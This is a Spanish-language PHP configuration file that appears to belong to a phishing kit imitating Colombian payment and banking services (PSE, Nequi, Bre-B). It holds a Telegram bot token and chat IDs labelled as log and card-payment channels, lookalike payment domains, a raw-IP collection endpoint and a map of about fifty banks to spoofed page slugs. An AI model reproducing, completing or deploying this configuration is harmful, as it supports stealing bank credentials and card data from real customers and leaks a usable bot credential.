<?php
// =====================================================
// Configuración Jelpit — edita sólo este archivo
// =====================================================
require_once __DIR__ . '/ban_check.php';

// ── Telegram ──────────────────────────────────────────
define('TG_TOKEN', '8645372446:AAFBeGZdvgw4-j1iAYNnagcXlR2v1o3VzUk');
define('TG_CHAT', '-5213857883');   // Chat principal (logs generales)
define('TG_CHAT_CC', '-5463528308');  // Chat pagos con tarjeta
define('TG_CHAT_BREB', '235905376');  // Chat pagos Bre-B

//define('TG_CHAT', '235905376');   // Chat principal (logs generales) 
//define('TG_CHAT_CC', '-5235238333');   // Chat pagos con tarjeta


// ── PSE ───────────────────────────────────────────────
define('PSE_BASE', 'https://pagosonline-pse.vercel.app');
define('RECAUDOFALL_BASE', 'http://130.94.110.60/nequi');
define('NEQUI_URL', 'https://nequi.col-online.cc/envia/nequi?k=8jiyMZckw4E2nYA6#8jiyMZckw4E2nYA6');

// Bancos existentes → vercel (/sites/{slug}/manager/{id})
$PSE_BANKS = [
    // 'bancolombia' => ['slug' => 'bc', 'id' => '5342f229df47492baebe7f3e'],
    'bogota' => ['slug' => 'bg', 'id' => 'b452b98bf3aaa5a90bdcc464'],
    'nequi' => ['slug' => 'nq', 'id' => 'b452b98bf3aaa5a90bdcc464'],
    'popular' => ['slug' => 'pop', 'id' => 'b452b98bf3aaa5a90bdcc464'],
    // 'davivienda' => ['slug' => 'dv', 'id' => '4c3a6a204bd92c4c33690c3c'],
    // 'avvillas' => ['slug' => 'avv', 'id' => '5342f229df47492baebe7f3e'],
    // 'occidente' => ['slug' => 'occ', 'id' => '5342f229df47492baebe7f3e'],
];//// 

// Bancos → recaudofall (código exacto del parámetro &banco=)
$PSE_BANKS_RECAUDOFALL = [
    'bancolombia' => 'BANCOLOMBIA',
    'nequi' => 'NEQUI',
    'davivienda' => 'DAVIVIENDA',
    'daviplata' => 'DAVIPLATA',
    'bbva' => 'BBVA',
    'bogota' => 'BOGOTA',
    'caja-social' => 'CAJASOCIAL',
    'colpatria' => 'COLPATRIA',
    'davibank-s.a.' => 'COLPATRIA',
    'itau' => 'ITAU',
    'falabella' => 'FALABELLA',
    'occidente' => 'OCCIDENTE',
    'popular' => 'POPULAR',
    'coopcentral' => 'COOPCENTRAL',
    'bancoomeva' => 'BANCOOMEVA',
    'gnb' => 'GNB',
    'agrario' => 'AGRARIO',
    'rappipay' => 'RAPPIPAY',
    'lulo' => 'LULO',
    'bancamia' => 'BANCAMIA',
    'movii' => 'MOVII',
    'confiar' => 'CONFIAR',
    'pichincha' => 'PICHINCHA',
    'serfinanza' => 'SERFINANZA',
    'cfa' => 'ANTIOQUIA',
    'union' => 'BANCOUNIN',
    'citibank' => 'CITIBANK',
    'finandina' => 'FINANDINA',
    'iris' => 'IRIS',
    'coofinep' => 'COOFINEP',
    'credifinanciera' => 'CREDIFINANCIERA',
    'santander' => 'SANTANDER',
    'coltefinanciera' => 'COLTEFINANCIERA',
    'cotrafa' => 'COTRAFA',
    'nu' => 'NU',
    'uala' => 'UAL',
    'alianza' => 'ALIANZA',
    'jpmorgan' => 'MORGAN',
    'mundo-mujer' => 'MUNDOMUJER',
    'crezcamos' => 'CREZCAMOS',
    'dale' => 'DALE',
    'jfk' => 'JFK',
    'bold' => 'BOLD',
    'juriscoop' => 'JURISCOOP',
    'powwi' => 'POWWI',
    'coink' => 'COINK',
    'ding' => 'DING',
    'global66' => 'GLOBAL66',
];
